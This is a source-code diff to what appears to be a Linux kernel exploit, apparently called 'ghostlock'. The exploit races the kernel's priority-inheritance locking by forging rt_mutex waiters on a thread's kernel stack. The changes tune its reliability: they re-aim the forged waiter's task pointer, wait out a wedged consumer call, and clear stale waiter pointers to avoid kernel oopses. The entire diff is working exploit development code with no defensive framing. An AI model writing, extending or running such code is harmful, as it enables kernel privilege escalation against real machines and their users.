@@ -105,7 +105,11 @@ namespace ghostlock::route::sigreturn {
 
     void SigreturnRoute::disarm() noexcept {
         race->consumer_go.store(0);
-        if (race->consumer_inflight.load() != 0) {
+        /* A call the attempt loop already found wedged is not waited on twice:
+         * the loop's own drain timed out with a 1 s bound, and this 2 s usleep
+         * poll is itself deep-stack traffic over the frame that walk is reading
+         * (docs/analysis/consumer-stuck-attempt-protocol-plan.md). */
+        if (!consumer_stuck && race->consumer_inflight.load() != 0) {
             for (int32_t i = 0;
                  i < 2000 && race->consumer_inflight.load() != 0;
                  i++) {
@@ -154,6 +158,7 @@ namespace ghostlock::route::sigreturn {
 
 #include "route/lock_anchor.h"
 #include "route/route_lifecycle.hpp"
+#include "route/route_policy.hpp"   /* route_needs_ghost_disarm (the per-attempt clear) */
 #include "support/decls.hpp"
 
 using namespace ghostlock;
@@ -453,8 +458,16 @@ namespace ghostlock::route::sigreturn {
                 static_cast<unsigned long long>(stamp.right),
                 static_cast<unsigned long long>(stamp.left),
                 static_cast<unsigned long long>(request->target));
+        /* The waiter's `task` word is read exactly once in this flow -- step [9]'s
+         * wake_up_process(rt_mutex_top_waiter(lock)->task), which our own enqueue
+         * makes reachable -- and the *chain* never uses it (the walk follows the
+         * lock's `owner`). Aiming it at the forged task made that wake cost
+         * 131 ms-5.38 s per call (external/port/consumer-drain/arm-c, arm-d); a
+         * running real task makes try_to_wake_up bail at its first test
+         * (docs/analysis/stack-waiter-task-word-plan.md). The page waiter's stamp
+         * and the TCP route's on-stack waiter already carry slide_init_task(). */
         const memory::WaiterWords words = memory::waiter_words(
-            stamp_layout, (session::g_exploit_session.heap.current.fake_task), lock,
+            stamp_layout, ghostlock::profile::slide_init_task(), lock,
             kernel::waiter_prio_word(
                     kernel::FAKE_WAITER_PRIO,
                     session::g_exploit_session.profile.compact_waiter_has_wake_state()));
@@ -554,25 +567,54 @@ namespace ghostlock::route::sigreturn {
                     static_cast<unsigned long long>(lock_word),
                     static_cast<long long>(now_us_since(route_t0) / 1000));
             stamp_window(route_t0);
+            /* The consumer's call started with the window and is still in the
+             * kernel: the walk reads its fake waiter out of THIS thread's kernel
+             * stack, and it outlives the 30 ms window by ~200 ms (measured; the
+             * records in k81/era-rate). Everything below writes over that stack
+             * -- the disarm, the print, and the next attempt's respray -- so the
+             * sequence is closed and the call waited out first
+             * (docs/analysis/consumer-stuck-attempt-protocol-plan.md). */
+            const int32_t drain_ms =
+                    race->wait_consumer_idle(ghostlock::race::PiRace::kConsumerDrainMs);
+            /* The attempt's frame is dead weight from here on: the print below
+             * and every later syscall in this thread run over it, and a consumer
+             * sched_setattr walking this thread's pi_blocked_on would read
+             * whatever they leave there -- the 2026-10-14 +0x188 oopses. Clear
+             * the pointer first (docs/analysis/stale-waiter-lifetime-plan.md). */
+            if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
+                int32_t disarm_errno = 0;
+                (void) support::ghost_disarm("attempt", &disarm_errno);
+            }
             /* `stamps` is the handler's patch count (one per trigger signal, so
              * always 1 here). The loop's own copy count is the trampoline's
-             * counter -- without it, "did the loop actually run?" costs a trace. */
+             * counter -- without it, "did the loop actually run?" costs a trace.
+             * `drain` is how long the consumer's call took to come back, and -1
+             * is a call still inside the kernel. */
             pr_info("sigreturn post-stamp attempt=%d/%d stamps=%d copies=%lu misses=%d "
-                    "path_sve=%d +%lldms\n",
+                    "path_sve=%d drain=%dms +%lldms\n",
                     attempt, kAttempts, g_patched - patched_before,
                     ghostlock_loop_stamps, g_misses,
-                    g_last_path_sve,
+                    g_last_path_sve, drain_ms,
                     static_cast<long long>(now_us_since(route_t0) / 1000));
-            race->consumer_go.store(0);
 
             const int32_t calls = race->consumer_calls.load();
             const int32_t successes = race->consumer_success.load();
             calls_total += calls;
             successes_total += successes;
-            if (calls > 0 && successes > 0) {
+            if (drain_ms >= 0 && calls > 0 && successes > 0) {
                 status.code = ROUTE_OK;
                 status.step = 0;
                 status.error_number = 0;
+                break;
+            }
+            if (drain_ms < 0) {
+                /* The call never came back: a walk is wedged in the kernel, and
+                 * another attempt could only pour more of this thread's writes
+                 * over it. Stop here; the lifecycle's disarm reports the race
+                 * dirty and the caller stops the run. */
+                consumer_stuck = 1;
+                (void) fail(38, 0);
+                status.code = ROUTE_DIRTY_FAILURE;
                 break;
             }
             (void) fail(33, 0);
